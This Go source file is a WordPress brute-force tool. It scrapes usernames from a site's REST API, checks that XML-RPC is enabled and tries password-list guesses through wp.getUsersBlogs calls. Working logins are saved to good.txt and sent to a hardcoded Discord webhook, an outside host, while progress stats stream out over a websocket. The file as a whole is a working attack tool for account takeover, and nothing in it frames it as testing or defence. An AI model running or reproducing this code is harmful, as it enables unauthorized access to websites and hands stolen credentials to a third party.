package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// Reads and filters credentials from a file
func readCredentials(filePath string) ([]string, error) {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	keys := make([]string, 0)
	lines := strings.Split(string(content), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			keys = append(keys, line)
		}
	}

	return keys, nil
}

// Reads file contents line by line
func ReadFile(filename string) ([]string, error) {
	// Open the file
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	// Create a scanner to read the file line by line
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	// Check if there were errors while reading the file
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}

// Extracts WordPress usernames from site API
func scrapeWPUsers(baseURL string, client *http.Client) ([]string, error) {
	// Remove trailing slash if present
	baseURL = strings.TrimSuffix(baseURL, "/")

	// Try to get users from WP JSON API v2 endpoint
	apiURL := baseURL + "/wp-json/wp/v2/users"
	resp, err := client.Get(apiURL)
	if err != nil {
		return nil, fmt.Errorf("error accessing WordPress API: %v", err)
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %v", err)
	}

	// Check if response contains usernames
	if !bytes.Contains(body, []byte(`"slug"`)) {
		return nil, fmt.Errorf("no user data found in API response")
	}

	// Extract usernames from response
	var users []string
	segments := bytes.Split(body, []byte(`"slug":"`))

	for i := 1; i < len(segments); i++ {
		end := bytes.Index(segments[i], []byte(`"`))
		if end > 0 {
			username := string(segments[i][:end])
			users = append(users, username)
		}
	}

	if len(users) == 0 {
		return nil, fmt.Errorf("no usernames found")
	}

	return users, nil
}

// Performs WordPress brute force attack via XML-RPC
func wpbrute(url string, client *http.Client) error {
	// Extract usernames from the site
	usernames, err := scrapeWPUsers(url, client)
	if err != nil {
		return err
	}

	if len(usernames) == 0 {
		bad++
		progress++
		return fmt.Errorf("no usernames found for URL: %s", url)
	}

	// Create info struct with domain and usernames
	info := infos{
		domain:   url,
		username: usernames,
	}

	// Read password list
	xPassword, err := ReadFile(passFile)
	if err != nil {
		return err
	}
	if checkXMLRPC(url, client) {
		WordPress++
		// Try each password pattern
		for _, pattern := range xPassword {
			// Try for each extracted username
			for _, username := range info.username {
				var password string

				// Replace pattern macros
				if strings.Contains(pattern, "[WPLOGIN]") {
					password = strings.ReplaceAll(pattern, "[WPLOGIN]", username)
				} else if strings.Contains(pattern, "[UPPERLOGIN]") {
					password = strings.ReplaceAll(pattern, "[UPPERLOGIN]", strings.ToUpper(username))
				} else if strings.Contains(pattern, "[UPPERALL]") {
					password = strings.ToUpper(username)
				} else if strings.Contains(pattern, "[DOMAIN]") {
					parts := strings.Split(info.domain, ".")
					if len(parts) > 0 {
						password = parts[0]
					}
				} else {
					password = pattern
				}

				if password == "" {
					continue
				}

				// Try to connect with generated credentials
				err := connectToWordPress(url, username, password, client)
				if err != nil {
					tries++
				} else {
					sendDiscordWebhook(url, username, password)
					// Save working credentials to file
					f, err := os.OpenFile("good.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
					if err != nil {
						fmt.Printf("Error opening good.txt: %v\n", err)
					} else {
						defer f.Close()
						if _, err := f.WriteString(fmt.Sprintf("%s:%s:%s\n", url, username, password)); err != nil {
							fmt.Printf("Error writing to good.txt: %v\n", err)
						}
					}
					goods++
					progress++
					return nil // Found working credentials
				}
			}
		}
	} else {
		bad++
		progress++
		return nil
	}

	return nil
}

// Displays attack progress and statistics
func displayProgress() {

	progressBar := "█"
	emptyBar := "░"
	barWidth := 24

	percentage := float64(progress) / float64(total) * 100
	filled := int((float64(progress) / float64(total)) * float64(barWidth))
	if filled < 0 {
		filled = 0
	}
	if filled > barWidth {
		filled = barWidth
	}
	bar := strings.Repeat(progressBar, filled) + strings.Repeat(emptyBar, barWidth-filled)

	output := fmt.Sprintf("\n╭──────────── WordPress Brute ────────────╮\n"+
		"│ Progress: %s %.1f%% │\n"+
		"├─────────────────────────────────────────┤\n"+
		"│ Total URLs: %-27d │\n"+
		"│ Processed: %-28d │\n"+
		"│ WordPress: %-28d │\n"+
		"│ Success: %-30d │\n"+
		"│ Failed: %-31d │\n"+
		"│ Attempts: %-29d │\n"+
		"╰─────────────────────────────────────────╯\n",
		bar, percentage, total, progress, WordPress, goods, bad, tries)

	fmt.Fprint(writer, output)
	time.Sleep(100 * time.Millisecond)
}

// Checks if XML-RPC is enabled on WordPress site
func checkXMLRPC(url string, client *http.Client) bool {
	// Construct the full URL for the xmlrpc.php file
	xmlrpcURL := url + "/xmlrpc.php"

	// Send a GET request to the xmlrpc.php endpoint
	resp, err := client.Get(xmlrpcURL)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Read response body to check for XML-RPC server
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	// Check if response contains XML-RPC server error message
	if strings.Contains(string(body), "XML-RPC server accepts POST requests only") {
		return true
	}

	// Also check status code as fallback
	return resp.StatusCode == 405
}

// Tests WordPress login credentials via XML-RPC
func connectToWordPress(url, username, password string, client *http.Client) error {
	// XML-RPC payload to call wp.getUsersBlogs method.
	payload := fmt.Sprintf(`<?xml version="1.0"?>
		<methodCall>
			<methodName>wp.getUsersBlogs</methodName>
			<params>
	
				<param>
					<value><string>%s</string></value>
				</param>
				<param>
					<value><string>%s</string></value>
				</param>
			</params>
		</methodCall>`, username, password)

	// Create request with headers
	req, err := http.NewRequest("POST", url+"/xmlrpc.php", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %w", err)
	}

	responseStr := string(body)
	fmt.Printf("Response: %s\n", responseStr)

	// Check for successful login
	if strings.Contains(responseStr, "<name>blogid</name>") ||
		strings.Contains(responseStr, "<name>blogName</name>") {
		return nil // Successfully logged in
	}

	// Check for specific error messages
	if strings.Contains(responseStr, "Incorrect username or password.") ||
		strings.Contains(responseStr, "Invalid username or password.") ||
		strings.Contains(responseStr, "<fault>") {
		return fmt.Errorf("invalid credentials")
	}

	// If response doesn't match expected patterns
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	return fmt.Errorf("unexpected response")
}

func connectAndSendStats(wg *sync.WaitGroup) {
start:
	defer wg.Done()
	// Create WebSocket connection
	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		fmt.Printf("WebSocket connection error: %v\n", err)
		time.Sleep(1 * time.Second)
		goto start
	}
	defer c.Close()

	// Send stats every 500ms
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for range ticker.C {
		stats := map[string]interface{}{
			"total":     total,
			"processed": progress,
			"success":   goods,
			"failed":    bad,
			"attempts":  tries,
			"wordpress": WordPress,
		}

		// Create a message that includes both the event name and data
		message := map[string]interface{}{
			"event": "stats",
			"data":  stats,
		}

		err = c.WriteJSON(message)
		if err != nil {
			fmt.Printf("Error sending stats data: %v\n", err)
			time.Sleep(1 * time.Second)
			goto start
		}
	}
}

func sendDiscordWebhook(url string, username string, password string) error {
	webhookURL := "https://discord.com/api/webhooks/1342690321787654207/Fhr6sbQ9Rn3cF6NRNwS1FTy71FEHbvedeHMWQBIInRbf7_ORLm1sO1KCOOsxfjQHizf3"
	if webhookURL == "" {
		return fmt.Errorf("DISCORD_WEBHOOK_URL environment variable not set")
	}

	// Create webhook message payload
	payload := map[string]interface{}{
		"content":    fmt.Sprintf("🎯 WordPress Login Found!\nURL: %s\nUsername: %s\nPassword: %s", url, username, password),
		"username":   "WP Brute",
		"avatar_url": "https://wordpress.org/favicon.ico",
	}

	// Convert payload to JSON
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("error marshaling JSON: %v", err)
	}

	// Send POST request to Discord webhook
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return fmt.Errorf("error sending webhook: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status code from Discord: %d", resp.StatusCode)
	}

	return nil
}
